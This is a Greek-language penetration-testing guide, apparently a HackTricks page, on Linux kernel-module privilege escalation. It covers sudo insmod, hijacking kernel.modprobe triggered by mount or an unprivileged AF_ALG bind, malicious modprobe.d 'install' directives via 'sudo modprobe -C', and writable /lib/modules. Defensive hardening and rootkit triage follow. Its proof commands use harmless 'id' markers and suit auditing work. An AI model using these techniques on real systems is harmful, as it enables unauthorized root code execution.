# Kernel Modules και κατάχρηση του modprobe

{{#include ../../banners/hacktricks-training.md}}

## Εσφαλμένες ρυθμίσεις kernel module και φόρτωσης modules

Η υποστήριξη kernel modules είναι ένας τομέας υψηλού αντίκτυπου κατά τον έλεγχο για κλιμάκωση προνομίων σε Linux. Μην θεωρείτε ότι κάθε μήνυμα για unsigned modules είναι από μόνο του εκμεταλλεύσιμο· χρησιμοποιήστε το, όμως, για να απαντήσετε σε πρακτικά ερωτήματα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Μπορεί ο τρέχων χρήστης να φορτώσει modules μέσω `sudo`, capabilities ή μιας εγγράψιμης διαδρομής helper;
- Είναι ακόμη ενεργή η φόρτωση modules;
- Είναι απενεργοποιημένη η επιβολή υπογραφής modules;
- Είναι εγγράψιμοι οι κατάλογοι modules, τα αρχεία modules ή οι διαδρομές ρυθμίσεων `modprobe.d`;<sup>[[16]](#references)</sup>
- Μπορούν να διαβαστούν τα kernel logs για επιβεβαίωση του τι συνέβη;

Η γρήγορη αρχική διαλογή ξεκινά με τους παρακάτω ελέγχους κατάστασης modules, υπογραφών, καταγραφής και δέντρου modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Ερμηνεία:

- `modules_disabled=1` σημαίνει ότι δεν είναι δυνατή ούτε η φόρτωση ούτε η αποφόρτωση modules, και η τιμή δεν μπορεί να επανέλθει σε `0` πριν από την επανεκκίνηση.<sup>[[1]](#references)</sup>
- Το `module.sig_enforce=1` στη γραμμή εντολών του kernel ή το `CONFIG_MODULE_SIG_FORCE=y` απαιτεί modules με έγκυρη υπογραφή· διαφορετικά, ενδέχεται να φορτωθούν unsigned modules και να επισημανθεί ο kernel ως αλλοιωμένος.<sup>[[2]](#references)</sup>
- Το `dmesg_restrict=0` δεν επιβάλλει περιορισμούς στο `dmesg`· όταν η τιμή είναι `1`, η πρόσβαση απαιτεί `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Τα εγγράψιμα paths κάτω από το `/lib/modules/$(uname -r)/` είναι επικίνδυνα, επειδή το `modprobe` αναζητά σε αυτό το δέντρο και στα δεδομένα εξαρτήσεών του κατά τη φόρτωση modules.<sup>[[8]](#references)</sup>

### Φόρτωση module και ανάγνωση εξόδου του kernel

Αν έχεις τη νόμιμη άδεια να φορτώσεις ένα τοπικό module, το `insmod` εισάγει το ακριβές αρχείο `.ko` που του παρέχεις. Η συνάρτηση init του module εκτελείται κατά τη φόρτωση, ενώ τα μηνύματα που γράφονται με `printk()` καταλήγουν στο buffer καταγραφής του kernel, το οποίο συνήθως διαβάζεται με το `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Μια βασική ροή ελέγχου χρησιμοποιεί το `modinfo` για την επιθεώρηση μεταδεδομένων, τα `insmod` και `rmmod` για τη φόρτωση και την αφαίρεση ενός module, το `lsmod` για την επιβεβαίωση της κατάστασης φόρτωσης και το `dmesg` για την επιθεώρηση των logs του kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Αν το `sudo -l` επιτρέπει τα `insmod`, `modprobe` ή ένα wrapper γύρω από αυτά, αντιμετωπίστε το ως κρίσιμο: το `sudo -l` εμφανίζει τα προνόμια του χρήστη που το εκτελεί, ενώ για τη φόρτωση ενός kernel module απαιτείται το `CAP_SYS_MODULE`. Δείτε τις [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) για άμεσες διαδρομές μέσω capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` που επιτρέπεται μέσω sudo

Ένας κανόνας sudo που επιτρέπει σε έναν χρήστη να εκτελεί το `insmod` δεν είναι συγκρίσιμος με την άδεια εκτέλεσης ενός συνηθισμένου βοηθητικού εργαλείου διαχείρισης. Ο κώδικας αρχικοποίησης της μονάδας εκτελείται κατά την εισαγωγή της, επομένως το πρακτικό ερώτημα κατά τον έλεγχο είναι αν ο χρήστης μπορεί να επιλέξει ή να τροποποιήσει τη μονάδα που θα φορτωθεί.<sup>[[3]](#references)</sup>

Η ακόλουθη γενική ροή ελέγχου επαναλαμβάνει αυτούς τους ελέγχους επιθεώρησης, φόρτωσης, κατάστασης, καταγραφών και αφαίρεσης για μια υποψήφια μονάδα.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Αν ο χρήστης μπορεί να παρέχει ένα αυθαίρετο `.ko`, ο κανόνας πρέπει να αντιμετωπίζεται ως πλήρης παραβίαση συστήματος σε μια εξουσιοδοτημένη αξιολόγηση. Μια ασφαλέστερη επιχειρησιακή πρακτική είναι να αποφεύγεται η ανάθεση φόρτωσης modules μέσω sudo· αν αυτό είναι αναπόφευκτο, περιορίστε την ακριβή διαδρομή, την ιδιοκτησία, τα δικαιώματα, την πολιτική υπογραφής και τη διαδικασία αφαίρεσης.<sup>[[3]](#references)[[10]](#references)</sup>

Για ένα ακίνδυνο μοτίβο κατασκευής module σε ελεγχόμενο εργαστήριο, παρακάτω παρουσιάζονται ένας ελάχιστος πηγαίος κώδικας και ένα Makefile· η μορφή `make -C /lib/modules/$(uname -r)/build M=$PWD` ακολουθεί τη documented ροή εργασίας kbuild του kernel για εξωτερικά modules.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Κάντε build και load μόνο σε εξουσιοδοτημένο εργαστήριο· το kbuild δημιουργεί το εξωτερικό module και οι εντολές load/remove καλούν τις διεπαφές των kernel modules.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Έλεγχοι κατάχρησης των `kernel.modprobe` / `modprobe_path`

Το `kernel.modprobe` ορίζει το userspace helper που εκτελεί ο kernel για αιτήματα αυτόματης φόρτωσης modules· αυτό το sysctl επηρεάζει την αυτόματη φόρτωση και όχι τη ρητή εισαγωγή modules. Αν ένας attacker μπορεί να το αλλάξει ώστε να δείχνει σε εκτελέσιμο αρχείο στο οποίο έχει δικαίωμα εγγραφής και να προκαλέσει αίτημα φόρτωσης module, το helper γίνεται διαδρομή εκτέλεσης κώδικα με προνόμια. Η ρύθμισή του σε κενή συμβολοσειρά απενεργοποιεί τα αιτήματα αυτόματης φόρτωσης· αν είναι ενεργό το `CONFIG_STATIC_USERMODEHELPER=y`, μια μη κενή τιμή αντικαθίσταται από τη διαδρομή του στατικού helper που έχει ενσωματωθεί κατά τη μεταγλώττιση.<sup>[[1]](#references)</sup>

Ελέγξτε την τρέχουσα διαδρομή του helper μέσω της διεπαφής sysctl του kernel και εξετάστε τον ιδιοκτήτη και τα δικαιώματα του αρχείου-στόχου.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Ελέγξτε αν μπορούν να επηρεαστούν τα sysctl, οι εκχωρημένοι κανόνες sudo ή οι δυνατότητες αρχείων.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Το παρακάτω μοτίβο, αποκλειστικά για χρήση σε εργαστήριο, αλλάζει τη διαδρομή του helper και ενεργοποιεί ένα τεκμηριωμένο αίτημα αυτόματης φόρτωσης module· χρησιμοποιήστε το μόνο σε απομονωμένο, εξουσιοδοτημένο σύστημα.<sup>[[1]](#references)</sup>

Σε σύγχρονους πυρήνες Linux, μην χρησιμοποιείτε ένα άγνωστο εκτελέσιμο ως γενικό trigger: η παρωχημένη αυτόματη φόρτωση module για προσαρμοσμένες μορφές δυαδικών αρχείων καταργήθηκε στο Linux 6.14, ενώ η τεκμηρίωση του kernel αναγνωρίζει έναν άγνωστο τύπο filesystem ως διαδρομή αιτήματος αυτόματης φόρτωσης module.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Σε hardened συστήματα, αυτό θα πρέπει να αποτυγχάνει όταν τα δικαιώματα αποτρέπουν τις μη προνομιούχες εγγραφές στο `kernel.modprobe`, η διαδρομή του helper δεν είναι εγγράψιμη ή η αυτόματη φόρτωση modules είναι απενεργοποιημένη.<sup>[[1]](#references)</sup>

### Μη προνομιούχος trigger αυτόματης φόρτωσης AF_ALG

Το παραπάνω trigger του filesystem χρησιμοποιεί προνομιούχο `mount`.<sup>[[1]](#references)</sup> Όπου είναι διαθέσιμα τα AF_ALG sockets, ένας μη προνομιούχος χρήστης μπορεί αντ' αυτού να συνδέσει ένα σε έναν σκόπιμα ανύπαρκτο τύπο.<sup>[[17]](#references)[[18]](#references)</sup> Στη συνέχεια, το `alg_bind()` ζητά το `algif-<type>` μέσω του `request_module()`, το οποίο καλεί τον διαμορφωμένο helper module.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Αυτό εξακολουθεί να λειτουργεί μετά την αφαίρεση της παλιάς αυτόματης φόρτωσης για άγνωστες μορφές δυαδικών αρχείων στο Linux 6.14.<sup>[[11]](#references)[[17]](#references)</sup> Είναι αναμενόμενο να αποτύχει το `bind()`, επειδή ο τύπος δεν υπάρχει· ελέγξτε την παρενέργεια του helper αντί για την τιμή επιστροφής του socket.<sup>[[17]](#references)[[18]](#references)</sup>

Σε εξουσιοδοτημένο lab, ρυθμίστε πρώτα τον ελεγχόμενο helper ή έναν κανόνα `modprobe.d` και, στη συνέχεια, ενεργοποιήστε ένα αίτημα χωρίς `sudo` ή `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Η Python 3.6+ δέχεται πλειάδα bind `(type, name)` για AF_ALG.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Αυτή η διαδρομή απαιτεί ένα λειτουργικό socket AF_ALG και μη κενή τιμή `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Σε kernels με `/proc/sys/crypto/af_alg_restrict`, η τιμή `2` απενεργοποιεί τη δημιουργία socket AF_ALG· η τιμή `1` περιορίζει τους αλγόριθμους, αλλά δεν εμποδίζει το αίτημα για ανύπαρκτο τύπο στο `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> Ένα LSM μπορεί να απορρίψει το αίτημα φόρτωσης module πριν κληθεί ο βοηθητικός μηχανισμός.<sup>[[19]](#references)</sup>

### Εγγράψιμη διαμόρφωση `modprobe.d` και `sudo modprobe -C`

Πριν επιλύσει ένα module, το `modprobe` διαβάζει αρχεία `.conf` από καταλόγους διαμόρφωσης όπως οι `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` και `/lib/modprobe.d`, με σειρά προτεραιότητας. Ένα αρχείο με το ίδιο όνομα σε κατάλογο υψηλότερης προτεραιότητας υπερισχύει του αρχείου σε κατάλογο χαμηλότερης προτεραιότητας. Το σημαντικότερο είναι ότι μια οδηγία `install <module> <command>` εκτελεί μια αυθαίρετη εντολή shell **αντί να** εισάγει αυτό το module. Συνεπώς, μια εγγράψιμη διαδρομή διαμόρφωσης μπορεί να οδηγήσει σε καθυστερημένη εκτέλεση εντολών με τα διαπιστευτήρια ενός μεταγενέστερου προνομιούχου χρήστη του `modprobe`· η επιβολή υπογραφής kernel δεν πιστοποιεί αυτήν την εντολή userspace.<sup>[[16]](#references)</sup>

Ελέγξτε τα δικαιώματα καταλόγων και αρχείων και, στη συνέχεια, επιθεωρήστε την ενεργή διαμόρφωση. Το `modprobe -n -v` είναι ασφαλές για έλεγχο επίλυσης, καθώς η λειτουργία dry-run ούτε εισάγει το module ούτε εκτελεί εντολή `install`/`remove`. Προτιμήστε το `modprobe -c` αντί της παλαιότερης γραφής `--showconfig`, την οποία η τρέχουσα τεκμηρίωση του kmod χαρακτηρίζει προς κατάργηση μετά το kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Ένας μη περιορισμένος κανόνας sudo για το `modprobe` είναι εκμεταλλεύσιμος ακόμη κι όταν δεν είναι δυνατή η επαλήθευση υπογραφής αυθαίρετων αρχείων `.ko`: το `-C` επιλέγει έναν κατάλογο ρυθμίσεων που ελέγχει ο επιτιθέμενος, από τον οποίο μπορεί να εκτελεστεί μια εντολή `install` από τη διεργασία που εκκινήθηκε μέσω sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Αν ένας κατάλογος `modprobe.d` που είναι ορατός στον βοηθό του kernel είναι εγγράψιμος, το ίδιο [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) μπορεί να εκτελέσει αμέσως μια οδηγία `install algif-htprobe`, χωρίς να περιμένει να καλέσει ένας διαχειριστής το `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Σε ένα εξουσιοδοτημένο lab, τοποθετήστε μια ακίνδυνη εντολή marker σε ένα εγγράψιμο `.conf`, επιβεβαιώστε την επίλυση με `modprobe -n -v algif-htprobe` και, στη συνέχεια, εκτελέστε το trigger παραπάνω.<sup>[[8]](#references)[[16]](#references)</sup> Τα `modules_disabled=1` και η επιβολή υπογραφής modules εμποδίζουν την εισαγωγή modules, όχι αυτήν την εντολή userspace `install`· ένα κενό `kernel.modprobe` ή ένας αποκλεισμένος δρόμος AF_ALG πράγματι αποτρέπει αυτήν τη διαδρομή autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Για τον μετριασμό του κινδύνου, μην επιτρέπετε μέσω sudo τη χρήση του `modprobe` χωρίς περιορισμούς στα ορίσματα, διατηρείτε όλους τους καταλόγους ρυθμίσεων στην ιδιοκτησία του root και χωρίς δικαίωμα εγγραφής, και ελέγχετε για μη αναμενόμενες οδηγίες `install`/`remove`. Όταν μια έμπιστη διαχειριστική διαδικασία πρέπει να παρακάμψει τέτοιες οδηγίες για ένα module, το `modprobe --ignore-install` τις αγνοεί για το συγκεκριμένο module, αλλά οι εξαρτήσεις μπορεί να έχουν δικές τους εντολές.<sup>[[8]](#references)[[16]](#references)</sup>

### Έλεγχος εγγράψιμων καταλόγων `/lib/modules`

Οι εγγράψιμοι κατάλογοι modules μπορούν να επιτρέψουν την αντικατάσταση modules, την τοποθέτηση κακόβουλων modules ή την κατάχρηση της αυτόματης φόρτωσης, ανάλογα με τον τρόπο με τον οποίο θα κληθεί αργότερα το `modprobe`· το `modprobe` αναζητά στο `/lib/modules/$(uname -r)` και χρησιμοποιεί τα δεδομένα εξαρτήσεών του κατά την επίλυση των modules.<sup>[[8]](#references)</sup>

Ελέγξτε τα εγγράψιμα αρχεία modules και τα μεταδεδομένα εξαρτήσεων/alias στο δέντρο modules της ενεργής έκδοσης του kernel.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Αν εντοπίσετε εγγράψιμο περιεχόμενο μονάδας, εξετάστε πώς το `modprobe` επιλύει τις εξαρτήσεις και πώς το `modinfo` αναφέρει τα μεταδεδομένα της μονάδας.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Αμυντικές σημειώσεις:

- Διατηρήστε το `/lib/modules` με ιδιοκτήτη `root:root` και χωρίς δικαίωμα εγγραφής από χρήστες.<sup>[[8]](#references)</sup>
- Ορίστε το `kernel.modules_disabled=1` μετά την εκκίνηση, όπου αυτό είναι λειτουργικά εφικτό.<sup>[[1]](#references)</sup>
- Επιβάλετε την υπογραφή modules σε συστήματα που απαιτούν φορτώσιμα modules.<sup>[[2]](#references)</sup>
- Παρακολουθείτε τις εγγραφές στα `/proc/sys/kernel/modprobe`, `/lib/modules` και στους καταλόγους ρυθμίσεων `modprobe.d`, καθώς και την απρόσμενη εκτέλεση των `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Διαλογή περιστατικών rootkit βασισμένου σε module

Ένα κακόβουλο module μπορεί να παρεμβάλλεται στα syscalls, στις προβολές του VFS ή του `/proc`, στις διαδρομές δικτύου ή στους ελέγχους διαπιστευτηρίων, ώστε να αποκρύπτει διεργασίες και αρχεία, να ανακατευθύνει την κίνηση ή να υποκλέπτει μυστικά. Μπορεί επίσης να αφαιρεθεί από τη λίστα modules που εμφανίζει το `lsmod`. Η επιμονή μπορεί να βασίζεται σε aliases ή κανόνες install του `modprobe.d`, στο `/etc/modules-load.d`, σε μια μονάδα systemd, σε περιεχόμενο initramfs ή στην αντικατάσταση ενός νόμιμου αρχείου `.ko`. Ένα κανονικό αποτέλεσμα του `lsmod` αποτελεί χρήσιμο αποδεικτικό στοιχείο, αλλά ένας συμβιβασμός σε επίπεδο kernel μπορεί να καταστήσει αναξιόπιστες τις λίστες που παρέχονται από τον kernel. Διασταυρώστε τα φορτωμένα modules, τα αρχεία στον δίσκο, τις ρυθμίσεις εκκίνησης, τα αρχεία καταγραφής φόρτωσης modules και αξιόπιστα εξωτερικά δεδομένα τηλεμετρίας.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Ελέγξτε για απροσδόκητα ονόματα, διαδρομές, εξαρτήσεις, υπογραφές και χρόνους φόρτωσης modules. Οι ενδείξεις kernel taint και unsigned modules είναι στοιχεία προς διερεύνηση, όχι απόδειξη ύπαρξης rootkit. Αν υπάρχει υποψία για rootkit, συλλέξτε αποδεικτικά στοιχεία από έμπιστο image ή περιβάλλον ανάκτησης πριν βασιστείτε στην έξοδο του ενεργού kernel. Η σελίδα [αξιολόγηση ευπαθειών kernel](kernel-vulnerability-assessment.md) καλύπτει τις ρυθμίσεις και την έκθεση διαγνωστικών στοιχείων, συμπεριλαμβανομένων των tracefs και των pinned BPF objects.



## References

- [1] [Τεκμηρίωση για το /proc/sys/kernel/ — τεκμηρίωση Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Μηχανισμός υπογραφής kernel module — τεκμηρίωση Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Βασικά στοιχεία Driver — τεκμηρίωση Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Καταγραφή μηνυμάτων με printk — τεκμηρίωση Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Δημιουργία εξωτερικών Modules — τεκμηρίωση Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Συγχώνευση tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Επαναφορά της τεχνικής modprobe_path: παράκαμψη του patch search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG bind και αίτημα module — πηγαίος κώδικας Linux kernel](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Κλήση module helper — πηγαίος κώδικας Linux kernel](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — τεκμηρίωση Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — τεκμηρίωση Linux kernel](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
